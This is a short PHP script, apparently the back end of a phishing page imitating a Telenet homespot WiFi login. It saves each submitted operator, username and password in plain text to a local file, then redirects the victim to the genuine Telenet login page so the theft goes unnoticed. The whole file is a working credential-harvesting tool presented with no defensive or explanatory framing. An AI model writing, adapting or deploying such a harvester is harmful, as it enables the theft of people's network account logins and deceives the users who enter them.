<?php
$operator = $_POST['operator'];
$username = $_POST['userName'];
$password = $_POST['passWord'];

$fp = fopen('formdata.txt', 'a');
$savestring = $operator . ',' . $username . ',' . $password . "\n";
fwrite($fp, $savestring);
fclose($fp);

?>

<script>
window.location="http://wifiportal.telenet.be/homespot/login.html";
</script>
